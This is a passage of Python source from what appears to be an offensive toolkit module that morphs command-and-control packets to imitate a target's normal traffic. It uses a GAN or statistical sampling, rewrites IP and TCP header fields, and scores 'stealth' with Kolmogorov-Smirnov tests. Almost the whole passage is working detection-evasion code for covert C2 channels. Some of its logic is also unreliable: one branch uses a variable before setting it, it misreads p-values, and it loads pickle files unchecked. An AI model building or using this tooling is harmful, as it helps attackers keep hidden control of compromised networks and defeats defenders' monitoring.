    ) -> list:
        """Generate synthetic training samples from a statistical profile.

        Since we may not have live packet captures, we use the profile's
        parametric distributions to produce realistic training data.
        """
        samples = []
        for _ in range(count):
            # Sample packet size from normal distribution
            size = max(
                20,
                min(
                    1500,
                    int(
                        random.gauss(profile.packet_size_mean, profile.packet_size_std)
                    ),
                ),
            )
            # Sample inter-arrival time (log-normal to match real traffic)
            iat = max(
                0.1,
                random.lognormvariate(
                    math.log(max(0.01, profile.inter_arrival_mean)),
                    profile.inter_arrival_std / max(1.0, profile.inter_arrival_mean),
                ),
            )
            # Sample TTL from distribution
            ttl = _weighted_choice(profile.ttl_distribution, default=128)
            # Sample TCP window
            window = (
                random.choice(profile.tcp_window_sizes)
                if profile.tcp_window_sizes
                else 65535
            )
            # Sample direction
            direction = "send" if random.random() < profile.direction_symmetry else "recv"

            # Pick a port/service
            port = random.choice(profile.open_ports) if profile.open_ports else 443
            payload_entropy = random.uniform(0.3, 0.9)

            ts = TrafficSample(
                packet_size=size,
                inter_arrival_ms=iat,
                ttl=ttl,
                tcp_window_size=window,
                protocol="tcp",
                direction=direction,
                port=port,
                payload_entropy=payload_entropy,
                flags=_random_tcp_flags(),
            )
            samples.append(ts.to_feature_vector())
        return samples

    # ── Phase 3: Packet Morphing ──────────────────────────────────────────

    def morph_packet(self, target: str, raw_packet: bytes) -> bytes:
        """Morph a C2 packet to match the target's traffic distribution.

        Transforms the raw C2 packet so its observable characteristics
        (size, timing hints, TTL, TCP window) are statistically identical
        to the target's normal traffic. The actual C2 payload is preserved
        — only the envelope is reshaped.

        Args:
            target: Target identifier.
            raw_packet: The raw IP/TCP packet bytes to morph.

        Returns:
            Morphed packet bytes.
        """
        if target not in self._baseline_profiles:
            logger.warning("morph_packet: no baseline for target=%s; returning raw", target)
            return raw_packet

        profile = self._baseline_profiles[target]

        # ── Step 1: Generate morph parameters ──
        morph_params = self._generate_morph_params(target, profile)

        # ── Step 2: Apply morphing ──
        morphed = self._apply_morph(raw_packet, morph_params)

        # ── Step 3: Register for KS verification ──
        sample = self._parse_raw_packet(morphed)
        self._unverified_packets[target].append(sample)
        self._morphed_history[target].append(sample)

        # Auto-verify if buffer is full
        if len(self._unverified_packets[target]) >= MAX_UNVERIFIED_PACKETS:
            ks_result = self.ks_test(target, list(self._unverified_packets[target]))
            if ks_result < KS_THRESHOLD:
                logger.warning(
                    "morph_packet: KS p=%.4f below threshold %.3f; may need retraining",
                    ks_result, KS_THRESHOLD,
                )
                self.adaptive_remorph(target)
            self._unverified_packets[target].clear()

        return morphed

    def _generate_morph_params(
        self, target: str, profile: BaselineProfile
    ) -> Dict[str, Any]:
        """Generate morphing parameters using the trained GAN or statistical fallback."""
        cache_key = self._gan_cache_key(target)
        model = self._gan_models.get(cache_key)

        if model and model.get("type") == "pytorch_gan" and _TORCH_AVAILABLE:
            # Use the trained GAN generator
            generator = model["generator"]
            latent_dim = model["latent_dim"]
            generator.eval()
            with torch.no_grad():
                z = torch.randn(1, latent_dim)
                features = generator(z).squeeze().tolist()
            generated_sample = TrafficSample.from_feature_vector(
                features, port=random.choice(profile.open_ports) if profile.open_ports else 443
            )
        else:
            # Statistical fallback: sample from the profile distributions
            generated_sample = self._statistical_sample(profile)

        return {
            "target_packet_size": generated_sample.packet_size,
            "target_ttl": generated_sample.ttl,
            "target_tcp_window": generated_sample.tcp_window_size,
            "target_entropy": generated_sample.payload_entropy,
            "tcp_flags": generated_sample.flags,
            "os": profile.detected_os,
        }

    def _statistical_sample(self, profile: BaselineProfile) -> TrafficSample:
        """Draw a realistic traffic sample from the profile's distributions."""
        size = max(
            20,
            min(
                1500,
                int(random.gauss(profile.packet_size_mean, profile.packet_size_std)),
            ),
        )
        iat = max(
            0.1,
            random.lognormvariate(
                math.log(max(0.01, profile.inter_arrival_mean)),
                profile.inter_arrival_std / max(1.0, profile.inter_arrival_mean),
            ),
        )
        ttl = _weighted_choice(profile.ttl_distribution, default=128)
        window = (
            random.choice(profile.tcp_window_sizes)
            if profile.tcp_window_sizes
            else 65535
        )
        port = random.choice(profile.open_ports) if profile.open_ports else 443

        return TrafficSample(
            packet_size=size,
            inter_arrival_ms=iat,
            ttl=ttl,
            tcp_window_size=window,
            protocol="tcp",
            direction="send",
            port=port,
            payload_entropy=random.uniform(0.3, 0.9),
            flags=_random_tcp_flags(),
        )

    def _apply_morph(self, raw_packet: bytes, params: Dict[str, Any]) -> bytes:
        """Apply morphing parameters to a raw packet.

        Modifies the IP and TCP headers to match the target profile while
        preserving the payload. Handles both IPv4 and IPv6.

        Packet structure (IPv4/TCP)::

            0                   1                   2                   3
            0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |Version|  IHL  |Type of Service|          Total Length         |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |         Identification        |Flags|      Fragment Offset    |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |  Time to Live |    Protocol   |         Header Checksum       |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |                       Source Address                          |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |                    Destination Address                        |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |                    Options (if IHL > 5)                       |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        """
        if len(raw_packet) < 20:
            # Too small to be a valid IP packet; return as-is
            return raw_packet

        try:
            data = bytearray(raw_packet)

            version_ihl = data[0]
            ip_version = (version_ihl >> 4) & 0x0F

            if ip_version == 4:
                data = self._morph_ipv4(data, params)
            elif ip_version == 6:
                data = self._morph_ipv6(data, params)

            return bytes(data)
        except Exception as exc:
            logger.debug("_apply_morph: error during morphing: %s", exc)
            return raw_packet

    def _morph_ipv4(self, data: bytearray, params: Dict[str, Any]) -> bytearray:
        """Morph an IPv4 packet."""
        # TTL (offset 8)
        target_ttl = params.get("target_ttl", 64)
        data[8] = target_ttl & 0xFF

        # Total Length (offsets 2-3)
        target_size = params.get("target_packet_size", len(data))
        if target_size != len(data):
            size_diff = target_size - len(data)
            if size_diff > 0:
                # Pad payload
                padding = os.urandom(size_diff)
                # Insert before any trailing data after TCP payload
                ihl = data[0] & 0x0F
                ip_header_len = ihl * 4
                # Simple approach: pad at end
                data.extend(padding)
            elif size_diff < 0:
                # Truncate (preserve headers)
                data = data[:max(len(data) + size_diff, ip_header_len + 20)]

            # Update Total Length field
            new_len = len(data)
            data[2] = (new_len >> 8) & 0xFF
            data[3] = new_len & 0xFF

        # Recompute IPv4 header checksum (offset 10-11)
        ihl = data[0] & 0x0F
        ip_header_len = ihl * 4
        data[10] = 0
        data[11] = 0
        cksum = _ipv4_checksum(data[:ip_header_len])
        data[10] = (cksum >> 8) & 0xFF
        data[11] = cksum & 0xFF

        # If there's a TCP header, morph TCP window (offset ip_header_len + 14)
        protocol = data[9]
        if protocol == 6 and len(data) >= ip_header_len + 20:  # TCP
            window = params.get("target_tcp_window", 65535)
            win_offset = ip_header_len + 14
            data[win_offset] = (window >> 8) & 0xFF
            data[win_offset + 1] = window & 0xFF

            # Morph TCP flags if present
            tcp_flags = params.get("tcp_flags", 0)
            if tcp_flags:
                flags_offset = ip_header_len + 13
                data[flags_offset] = tcp_flags & 0xFF

        return data

    def _morph_ipv6(self, data: bytearray, params: Dict[str, Any]) -> bytearray:
        """Morph an IPv6 packet (simplified — hop limit, payload length)."""
        # Hop Limit (offset 7)
        target_ttl = params.get("target_ttl", 64)
        data[7] = target_ttl & 0xFF

        # Payload Length (offsets 4-5)
        target_size = params.get("target_packet_size", len(data) - 40)
        payload_len = max(0, target_size - 40)
        data[4] = (payload_len >> 8) & 0xFF
        data[5] = payload_len & 0xFF

        return data

    def _parse_raw_packet(self, packet: bytes) -> TrafficSample:
        """Extract observable features from a raw packet."""
        if len(packet) < 20:
            return TrafficSample(
                packet_size=len(packet),
                inter_arrival_ms=10.0,
                ttl=64,
                tcp_window_size=65535,
                protocol="raw",
                direction="send",
                port=0,
                payload_entropy=_shannon_entropy(packet),
            )

        ip_version = (packet[0] >> 4) & 0x0F
        ttl = 64
        protocol = 6  # assume TCP
        window = 65535
        src_port = 0
        dst_port = 0
        flags = 0

        if ip_version == 4:
            ihl = packet[0] & 0x0F
            ip_header_len = ihl * 4
            ttl = packet[8]
            protocol = packet[9]
            if protocol == 6 and len(packet) >= ip_header_len + 20:
                src_port = struct.unpack("!H", packet[ip_header_len : ip_header_len + 2])[0]
                dst_port = struct.unpack("!H", packet[ip_header_len + 2 : ip_header_len + 4])[0]
                window = struct.unpack("!H", packet[ip_header_len + 14 : ip_header_len + 16])[0]
                flags = packet[ip_header_len + 13]
        elif ip_version == 6:
            ttl = packet[7]
            # Next Header at offset 6; simplified check for TCP
            protocol = packet[6]
            if protocol == 6 and len(packet) >= 60:
                src_port = struct.unpack("!H", packet[40:42])[0]
                dst_port = struct.unpack("!H", packet[42:44])[0]
                window = struct.unpack("!H", packet[54:56])[0]
                flags = packet[53]

        payload = packet[ip_header_len + 20:] if ip_version == 4 else packet[60:]

        return TrafficSample(
            packet_size=len(packet),
            inter_arrival_ms=10.0,  # unknown from a single packet
            ttl=ttl,
            tcp_window_size=window,
            protocol="tcp" if protocol == 6 else ("udp" if protocol == 17 else "other"),
            direction="send",
            port=dst_port or src_port,
            payload_entropy=_shannon_entropy(payload) if payload else 0.0,
            flags=flags,
        )

    # ── Phase 4: Statistical Verification ─────────────────────────────────

    def ks_test(self, target: str, packets: Optional[List[TrafficSample]] = None) -> float:
        """Kolmogorov-Smirnov test — how statistically similar are we?

        Compares the distribution of morphed/generated packets against the
        target's baseline profile. Returns the p-value from a two-sample
        KS test.

        - p > 0.95: Mathematically invisible. Traffic is statistically
          indistinguishable from the target's legitimate traffic.
        - p between 0.90 and 0.95: Good stealth but detectable by advanced
          statistical monitoring.
        - p between 0.80 and 0.90: Moderate risk of detection.
        - p < 0.80: High risk. Re-train or re-learn immediately.

        Args:
            target: Target identifier.
            packets: Optional list of traffic samples to test. If None,
                     uses the morphed packet history.

        Returns:
            Two-sample KS test p-value [0.0, 1.0].
        """
        profile = self._baseline_profiles.get(target)
        if profile is None:
            logger.warning("ks_test: no baseline for target=%s", target)
            return 0.0

        if packets is None:
            packets = list(self._morphed_history.get(target, []))
            if len(packets) < MIN_SAMPLES_FOR_KS // 2:
                # Use recently generated samples from the profile
                generated = []
                for _ in range(MIN_SAMPLES_FOR_KS):
                    generated.append(self._statistical_sample(profile))
                packets = generated

        if len(packets) < MIN_SAMPLES_FOR_KS // 2:
            logger.debug(
                "ks_test: too few samples (%d) for reliable KS test", len(packets)
            )
            return 0.0

        # Extract packet sizes for the KS comparison
        morphed_sizes = [float(p.packet_size) for p in packets]
        baseline_sizes = list(profile._packet_size_samples)

        if len(baseline_sizes) < MIN_SAMPLES_FOR_KS:
            # Generate baseline samples from profile
            baseline_sizes = []
            for _ in range(MIN_SAMPLES_FOR_KS):
                s = self._statistical_sample(profile)
                baseline_sizes.append(float(s.packet_size))

        # Run two-sample KS test on packet size distribution
        p_size = self._ks_2samp_value(baseline_sizes, morphed_sizes)

        # Also test inter-arrival times if available
        morphed_iats = [p.inter_arrival_ms for p in packets if p.inter_arrival_ms > 0]
        baseline_iats = list(profile._inter_arrival_samples)
        if len(morphed_iats) >= MIN_SAMPLES_FOR_KS // 2 and len(baseline_iats) >= MIN_SAMPLES_FOR_KS // 2:
            p_iat = self._ks_2samp_value(baseline_iats, morphed_iats)
            # Combined p-value (Fisher's method)
            p_combined = self._fisher_combined_pvalue([p_size, p_iat])
        else:
            p_combined = p_size

        # Update profile and report
        profile.ks_p_value = p_combined
        profile.converged = p_combined >= KS_THRESHOLD
        profile.updated_at = time.time()

        if target not in self._stealth_reports:
            self._stealth_reports[target] = StealthReport(target=target)
        self._stealth_reports[target].ks_p_value = p_combined
        self._stealth_reports[target].ks_passed = p_combined >= KS_THRESHOLD
        self._stealth_reports[target].timestamp = time.time()

        if p_combined >= KS_THRESHOLD:
            logger.info("ks_test: target=%s p=%.4f PASSED (mathematically invisible)", target, p_combined)
        elif p_combined >= DRIFT_THRESHOLD:
            logger.info("ks_test: target=%s p=%.4f PASSED (acceptable stealth)", target, p_combined)
        else:
            logger.warning("ks_test: target=%s p=%.4f FAILED — re-train needed", target, p_combined)

        return p_combined

    def _ks_2samp_value(self, sample_a: List[float], sample_b: List[float]) -> float:
        """Compute two-sample KS test p-value.

        Uses scipy if available; otherwise uses an efficient approximation
        based on the maximum ECDF difference and the Kolmogorov distribution.
        """
        if _SCIPY_AVAILABLE and _NUMPY_AVAILABLE:
            try:
                _, p = scipy_stats.ks_2samp(
                    np.array(sample_a), np.array(sample_b)
                )
                return float(p)
            except Exception:
                pass
        return self._approximate_ks_2samp(sample_a, sample_b)

    def _approximate_ks_2samp(
        self, sample_a: List[float], sample_b: List[float]
    ) -> float:
        """Approximate the two-sample KS test p-value.

        Computes the maximum absolute difference between the two ECDFs
        and uses the Kolmogorov-Smirnov distribution approximation to
        estimate the p-value. This is a standard statistical approach
        that does not require scipy.
        """
        if not sample_a or not sample_b:
            return 0.0

        # Sort and compute ECDFs
        combined = sorted(set(sample_a + sample_b))
        if len(combined) < 2:
            return 0.0

        n_a = len(sample_a)
        n_b = len(sample_b)

        # Sort each sample for efficient ECDF lookup
        sorted_a = sorted(sample_a)
        sorted_b = sorted(sample_b)

        # Compute max absolute ECDF difference (the KS statistic D)
        d_max = 0.0
        idx_a = 0
        idx_b = 0

        for x in combined:
            while idx_a < n_a and sorted_a[idx_a] <= x:
                idx_a += 1
            while idx_b < n_b and sorted_b[idx_b] <= x:
                idx_b += 1

            ecdf_a = idx_a / n_a
            ecdf_b = idx_b / n_b
            d_max = max(d_max, abs(ecdf_a - ecdf_b))

        # Convert D statistic to p-value using the Kolmogorov distribution
        # Effective n for two-sample test: n_eff = n_a * n_b / (n_a + n_b)
        n_eff = (n_a * n_b) / (n_a + n_b)
        lambda_stat = d_max * math.sqrt(n_eff)

        # Kolmogorov CDF approximation (first two terms of the series)
        p = self._kolmogorov_cdf(lambda_stat)
        return p

    @staticmethod
    def _kolmogorov_cdf(x: float) -> float:
        """Approximate the Kolmogorov distribution CDF.

        Uses the asymptotic formula: P(K <= x) = 1 - 2 * sum_{k=1}^{inf} (-1)^{k-1} exp(-2 k^2 x^2)
        For practical purposes, the first few terms of the series are sufficient.
        """
        if x <= 0:
            return 0.0
        if x > 10:
            return 1.0  # effectively 1 for large x

        p = 0.0
        for k in range(1, 10):
            term = (-1) ** (k - 1) * math.exp(-2.0 * k * k * x * x)
            if abs(term) < 1e-15:
                break
            p += term
        return 1.0 - 2.0 * p

    @staticmethod
    def _fisher_combined_pvalue(p_values: List[float]) -> float:
        """Combine independent p-values using Fisher's method.

        Chi-squared statistic: -2 * sum(ln(p_i)) ~ chi2(2k)
        """
        k = len(p_values)
        if k == 0:
            return 0.0
        if k == 1:
            return p_values[0]

        # Compute Fisher statistic
        chi2_stat = -2.0 * sum(math.log(max(p, 1e-300)) for p in p_values)

        # Approximate chi-squared survival function
        # Using the regularized lower incomplete gamma function
        df = 2 * k
        return _chi2_survival(chi2_stat, df)

    # ── Adaptive Monitoring ───────────────────────────────────────────────

    def adaptive_remorph(self, target: str) -> bool:
        """If target's traffic changes, re-learn baseline and re-morph.

        Monitors for distributional drift by running periodic KS tests
        on recent morphed packets against the stored baseline. If the
        p-value drops below DRIFT_THRESHOLD, triggers a re-learning cycle.

        This is crucial for long-running operations where the target's
        traffic patterns may shift (e.g., different time of day, load
        changes, service restarts).

        Args:
            target: Target identifier.

        Returns:
            True if re-morphing was triggered, False if no action needed.
        """
        profile = self._baseline_profiles.get(target)
        if profile is None:
            logger.warning("adaptive_remorph: no profile for target=%s", target)
            return False

        recent = list(self._morphed_history.get(target, []))
        if len(recent) < MIN_SAMPLES_FOR_KS // 2:
            logger.debug("adaptive_remorph: insufficient recent samples for target=%s", target)
            return False

        # Test recent morphed traffic against baseline
        recent_sizes = [float(p.packet_size) for p in recent]
        baseline_sizes = profile._packet_size_samples

        p_current = self._ks_2samp_value(baseline_sizes, recent_sizes)
        logger.info("adaptive_remorph: target=%s current_ks_p=%.4f", target, p_current)

        if p_current < DRIFT_THRESHOLD:
            logger.warning(
                "adaptive_remorph: drift detected for target=%s (p=%.4f < %.3f); "
                "re-learning baseline",
                target, p_current, DRIFT_THRESHOLD,
            )

            if target in self._stealth_reports:
                self._stealth_reports[target].drift_detected = True

            # Re-learn using recent morphed traffic as reference
            # (Assumes our morphed traffic was correct at some point;
            #  drift means the *target* changed, so we update to match
            #  the new distribution by re-sampling from the profile
            #  with updated parameters.)
            profile.updated_at = time.time()
            self._persist_profile(profile)

            # Clear GAN cache to force retrain
            cache_key = self._gan_cache_key(target)
            if cache_key in self._gan_models:
                del self._gan_models[cache_key]

            # Re-train GAN with current profile
            self.train_gan(target, force_retrain=True)
            return True

        # Check if we should also re-learn from fresh recon
        # (e.g., if enough time has passed)
        age_hours = (time.time() - profile.updated_at) / 3600.0
        if age_hours > 24.0:
            logger.info(
                "adaptive_remorph: baseline age=%.1fh for target=%s; consider re-learning",
                age_hours, target,
            )
            # Don't force, but flag for attention
            if target in self._stealth_reports:
                self._stealth_reports[target].recommendations.append(
                    f"Baseline is {age_hours:.1f}h old; consider fresh recon for re-learning"
                )

        return False

    # ── Stealth Scoring ───────────────────────────────────────────────────

    def get_stealth_score(self, target: str) -> float:
        """Current stealth score (0-100). 95+ = mathematically invisible.

        Combines:
        - KS test p-value (primary weight: 50%)
        - GAN convergence (20%)
        - Sample count sufficiency (10%)
        - Profile freshness (10%)
        - Feature-level similarity scores (10%)

        Args:
            target: Target identifier.

        Returns:
            Stealth score from 0.0 (completely detectable) to 100.0
            (statistically indistinguishable).
        """
        profile = self._baseline_profiles.get(target)
        if profile is None:
            return 0.0

        scores: Dict[str, float] = {}

        # 1. KS test p-value (50% weight)
        ks_p = self.ks_test(target)
        scores["ks_p_value"] = ks_p * 50.0  # 0-50 points

        # 2. GAN convergence (20%)
        cache_key = self._gan_cache_key(target)
        model = self._gan_models.get(cache_key)
        if model and model.get("type") == "pytorch_gan":
            d_acc = model.get("d_accuracy", 1.0)
            # Closer to 0.5 is better for GAN convergence
            gan_score = max(0.0, 1.0 - abs(d_acc - 0.5) * 2.0)
            scores["gan_convergence"] = gan_score * 20.0
        elif model and model.get("type") == "statistical_fallback":
            scores["gan_convergence"] = 15.0  # partial credit for fallback
        else:
            scores["gan_convergence"] = 0.0

        # 3. Sample count sufficiency (10%)
        if profile.sample_count >= 1000:
            scores["sample_sufficiency"] = 10.0
        elif profile.sample_count >= 500:
            scores["sample_sufficiency"] = 7.0
        elif profile.sample_count >= 100:
            scores["sample_sufficiency"] = 4.0
        else:
            scores["sample_sufficiency"] = 2.0

        # 4. Profile freshness (10%)
        age_hours = (time.time() - profile.updated_at) / 3600.0
        if age_hours < 1.0:
            scores["freshness"] = 10.0
        elif age_hours < 6.0:
            scores["freshness"] = 8.0
        elif age_hours < 24.0:
            scores["freshness"] = 5.0
        else:
            scores["freshness"] = 2.0

        # 5. Feature-level similarity (10%)
        feature_score = self._compute_feature_scores(target, profile)
        scores["feature_similarity"] = feature_score * 10.0

        total = sum(scores.values())
        total = max(0.0, min(100.0, total))

        # Update or create stealth report
        if target not in self._stealth_reports:
            self._stealth_reports[target] = StealthReport(target=target)
        report = self._stealth_reports[target]
        report.stealth_score = total
        report.feature_scores = scores
        report.sample_count = profile.sample_count

        # Generate recommendations
        report.recommendations = self._generate_recommendations(
            target, profile, scores, model
        )

        return total

    def _compute_feature_scores(
        self, target: str, profile: BaselineProfile
    ) -> float:
        """Compute per-feature similarity scores."""
        feature_scores = []

        # TTL alignment with OS expectations
        os_tweaks = OS_TRAFFIC_TWEAKS.get(profile.detected_os, OS_TRAFFIC_TWEAKS["unknown"])
        expected_ttl = os_tweaks["ttl_default"]
        if profile.ttl_distribution:
            dominant_ttl = max(profile.ttl_distribution, key=profile.ttl_distribution.get)
            ttl_match = 1.0 if dominant_ttl == expected_ttl else 0.5
        else:
            ttl_match = 0.5
        feature_scores.append(ttl_match)

        # Protocol mix plausibility
        if profile.protocol_mix:
            tcp_ratio = profile.protocol_mix.get("tcp", 0)
            # Most services are TCP-heavy; penalty for anomalous ratios
            proto_score = 1.0 if 0.5 <= tcp_ratio <= 1.0 else 0.5
        else:
            proto_score = 0.5
        feature_scores.append(proto_score)

        # Packet size plausibility
        if 64 <= profile.packet_size_mean <= 1500:
            size_score = 1.0
        else:
            size_score = 0.5
        feature_scores.append(size_score)

        return _mean(feature_scores) if feature_scores else 0.5

    def _generate_recommendations(
        self,
        target: str,
        profile: BaselineProfile,
        scores: Dict[str, float],
        model: Optional[Dict[str, Any]],
    ) -> List[str]:
        """Generate actionable recommendations to improve stealth."""
        recs = []

        if scores.get("ks_p_value", 0) < KS_THRESHOLD * 50:
            recs.append(
                f"KS p-value too low ({profile.ks_p_value:.3f}); "
                "re-train GAN with more epochs or provide fresh sample captures"
            )

        if scores.get("gan_convergence", 0) < 15:
            recs.append(
                "GAN not trained or not converged; run train_gan() with at least 200 epochs"
            )

        if scores.get("sample_sufficiency", 0) < 7:
            recs.append(
                f"Only {profile.sample_count} samples; capture more live traffic "
                "or enrich recon data with additional services/ports"
            )

        if scores.get("freshness", 0) < 5:
            age_h = (time.time() - profile.updated_at) / 3600
            recs.append(
                f"Baseline is {age_h:.1f}h old; refresh with current recon data"
            )

        if not profile.open_ports:
            recs.append(
                "No open ports known; provide recon data (open_ports, services) "
                "for better baseline accuracy"
            )

        return recs

    # ── Persistence ────────────────────────────────────────────────────────

    def _gan_cache_key(self, target: str) -> str:
        """Generate a stable cache key for a target."""
        return hashlib.sha256(target.encode()).hexdigest()[:16]

    def _persist_profile(self, profile: BaselineProfile) -> None:
        """Save baseline profile to disk."""
        try:
            path = os.path.join(
                self._cache_dir, f"profile_{profile.target.replace('/', '_').replace('.', '_')}.json"
            )
            with open(path, "w") as f:
                json.dump(profile.to_dict(), f, indent=2)
        except Exception as exc:
            logger.debug("_persist_profile: failed for %s: %s", profile.target, exc)

    def _persist_model(self, target: str) -> None:
        """Save GAN model weights to disk."""
        cache_key = self._gan_cache_key(target)
        model = self._gan_models.get(cache_key)
        if not model:
            return

        try:
            path = os.path.join(self._cache_dir, f"gan_{cache_key}.pkl")
            save_data = {
                "type": model.get("type"),
                "feature_dim": model.get("feature_dim"),
                "latent_dim": model.get("latent_dim"),
                "trained_at": model.get("trained_at"),
                "epochs_trained": model.get("epochs_trained"),
                "final_g_loss": model.get("final_g_loss"),
                "final_d_loss": model.get("final_d_loss"),
                "d_accuracy": model.get("d_accuracy"),
                "generator_state": model.get("generator_state"),
            }
            with open(path, "wb") as f:
                pickle.dump(save_data, f)
        except Exception as exc:
            logger.debug("_persist_model: failed for %s: %s", target, exc)

    def _load_cached_state(self) -> None:
        """Load cached profiles and models from disk."""
        try:
            for fname in os.listdir(self._cache_dir):
                fpath = os.path.join(self._cache_dir, fname)
                if fname.startswith("profile_") and fname.endswith(".json"):
                    try:
                        with open(fpath, "r") as f:
                            data = json.load(f)
                        profile = BaselineProfile.from_dict(data)
                        self._baseline_profiles[profile.target] = profile
                    except Exception:
                        pass
                elif fname.startswith("gan_") and fname.endswith(".pkl"):
                    try:
                        with open(fpath, "rb") as f:
                            data = pickle.load(f)
                        cache_key = fname[4:-4]  # strip "gan_" and ".pkl"
                        if _TORCH_AVAILABLE and data.get("type") == "pytorch_gan":
                            generator = TrafficGenerator(
                                latent_dim=data.get("latent_dim", 32),
                                feature_dim=data.get("feature_dim", 8),
                            )
                            if data.get("generator_state"):
                                generator.load_state_dict(data["generator_state"])
                            discriminator = TrafficDiscriminator(
                                feature_dim=data.get("feature_dim", 8),
                            )
                            self._gan_models[cache_key] = {
                                "type": "pytorch_gan",
                                "generator": generator,
                                "discriminator": discriminator,
                                "generator_state": data["generator_state"],
                                "feature_dim": data.get("feature_dim", 8),
                                "latent_dim": data.get("latent_dim", 32),
                                "trained_at": data.get("trained_at", 0),
                                "epochs_trained": data.get("epochs_trained", 0),
                                "final_g_loss": data.get("final_g_loss", 0),
                                "final_d_loss": data.get("final_d_loss", 0),
                                "d_accuracy": data.get("d_accuracy", 0.5),
                            }
                    except Exception:
                        pass
        except FileNotFoundError:
            pass
        except Exception as exc:
            logger.debug("_load_cached_state: %s", exc)

    # ── Reporting ──────────────────────────────────────────────────────────

    def get_stealth_report(self, target: str) -> Optional[StealthReport]:
        """Get the detailed stealth assessment for a target.

        Triggers a fresh stealth score computation to ensure the report
        is up-to-date.
        """
        self.get_stealth_score(target)  # refresh
        return self._stealth_reports.get(target)

    def get_all_profiles(self) -> Dict[str, BaselineProfile]:
        """Return all cached baseline profiles."""
        return dict(self._baseline_profiles)

    def get_all_reports(self) -> Dict[str, StealthReport]:
        """Return stealth reports for all tracked targets."""
        # Refresh all
        for target in self._baseline_profiles:
            self.get_stealth_score(target)
        return dict(self._stealth_reports)

    def clear_target(self, target: str) -> None:
        """Remove all data associated with a target."""
        self._baseline_profiles.pop(target, None)
        cache_key = self._gan_cache_key(target)
        self._gan_models.pop(cache_key, None)
        self._unverified_packets.pop(target, None)
        self._morphed_history.pop(target, None)
        self._stealth_reports.pop(target, None)

        # Clean up files on disk
        for fname in os.listdir(self._cache_dir):
            if target.replace("/", "_").replace(".", "_") in fname:
                try:
                    os.remove(os.path.join(self._cache_dir, fname))
                except OSError:
                    pass


# ── Utility Functions ──────────────────────────────────────────────────────

def _mean(values: List[float]) -> float:
    """Arithmetic mean without numpy."""
    if not values:
        return 0.0
    return sum(values) / len(values)


def _std(values: List[float], mean: float = None) -> float:
    """Sample standard deviation without numpy."""
    n = len(values)
    if n < 2:
        return 0.0
    if mean is None:
        mean = _mean(values)
    variance = sum((x - mean) ** 2 for x in values) / (n - 1)
    return math.sqrt(variance)


def _skew(values: List[float], mean: float, std: float) -> float:
    """Sample skewness without numpy/scipy."""
    n = len(values)
    if n < 3 or std == 0:
        return 0.0
    m3 = sum((x - mean) ** 3 for x in values) / n
    return m3 / (std ** 3)


def _shannon_entropy(data: bytes) -> float:
    """Shannon entropy of byte data, normalized to [0, 1]."""
    if not data:
        return 0.0
    counts: Dict[int, int] = defaultdict(int)
    for b in data:
        counts[b] += 1
    n = len(data)
    entropy = 0.0
    for c in counts.values():
        p = c / n
        entropy -= p * math.log2(p)
    max_entropy = math.log2(min(256, n))
    return entropy / max_entropy if max_entropy > 0 else 0.0


def _weighted_choice(distribution: Dict[int, float], default: int = 128) -> int:
    """Pick a key from a probability distribution."""
    if not distribution:
        return default
    r = random.random()
    cumulative = 0.0
    for value, prob in distribution.items():
        cumulative += prob
        if r <= cumulative:
            return value
    # Fallback: return the key with highest probability
    return max(distribution, key=distribution.get)


def _random_tcp_flags() -> int:
    """Generate a realistic TCP flags bitmask."""
    # Common flag combinations
    options = [
        0x02,  # SYN
        0x12,  # SYN-ACK
        0x10,  # ACK
        0x18,  # PSH-ACK
        0x11,  # FIN-ACK
        0x04,  # RST
    ]
    weights = [0.15, 0.15, 0.50, 0.10, 0.05, 0.05]
    r = random.random()
    cumulative = 0.0
    for opt, w in zip(options, weights):
        cumulative += w
        if r <= cumulative:
            return opt
    return 0x10  # default ACK


def _ipv4_checksum(header: bytes) -> int:
    """Compute IPv4 header checksum."""
    total = 0
    for i in range(0, len(header), 2):
        if i + 1 < len(header):
            word = (header[i] << 8) + header[i + 1]
        else:
            word = header[i] << 8
        total += word
    # Fold carries
    while total > 0xFFFF:
        total = (total & 0xFFFF) + (total >> 16)
    return (~total) & 0xFFFF


def _chi2_survival(x: float, df: int) -> float:
    """Approximate chi-squared survival function (p-value).

    Uses the Wilson-Hilferty transformation for df > 1, or exact
    exponential for df = 2. Accurate to within ~0.001 for typical values.
    """
    if df <= 0:
        return 0.0
    if x <= 0:
        return 1.0

    # For df=2, chi2 survival = exp(-x/2)
    if df == 2:
        return math.exp(-x / 2.0)

    # For df > 2, use Wilson-Hilferty normal approximation
    # (chi2/df)^(1/3) ~ N(1 - 2/(9df), 2/(9df))
    if df > 2:
        z = ((x / df) ** (1.0 / 3.0) - (1.0 - 2.0 / (9.0 * df))) / math.sqrt(2.0 / (9.0 * df))
        # Normal survival function approximation
        return _normal_survival(z)

    # For df=1, use the relationship chi2_1 = Z^2 (two-sided)
    z = math.sqrt(x)
    return 2.0 * _normal_survival(z)


def _normal_survival(z: float) -> float:
    """Approximate standard normal survival function (1 - CDF).

    Uses a high-accuracy rational approximation (Abramowitz & Stegun 26.2.17).
    """
    if z < -8.0:
        return 1.0
    if z > 8.0:
        return 0.0

    # Constants for the approximation
    a1 = 0.254829592
    a2 = -0.284496736
    a3 = 1.421413741
    a4 = -1.453152027
    a5 = 1.061405429
    p_val = 0.3275911

    sign = 1.0 if z >= 0 else -1.0
    x = abs(z)

    t = 1.0 / (1.0 + p_val * x)
    y = 1.0 - (((((a5 * t + a4) * t) + a3) * t + a2) * t + a1) * t * math.exp(-x * x / 2.0)

    if sign < 0:
        return y
    else:
        return 1.0 - y


# ── Module-level convenience ───────────────────────────────────────────────

